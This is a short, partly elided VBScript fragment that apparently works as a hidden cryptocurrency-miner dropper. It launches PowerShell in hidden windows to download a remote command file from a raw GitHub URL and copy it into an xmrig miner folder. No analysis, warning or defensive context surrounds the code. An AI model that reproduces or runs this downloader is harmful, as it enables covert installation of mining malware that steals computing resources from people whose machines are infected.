...
WScript.Sleep 2000
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPRUN.cmd -OutFile C:\XRPRUN.cmd", 0, True
...
objShell.Run "powershell.exe -Command Copy-Item -Path C:\XRPRUN.cmd -Destination C:\xmrig-6.22.2\XRPRUN.cmd -Force", 0, True
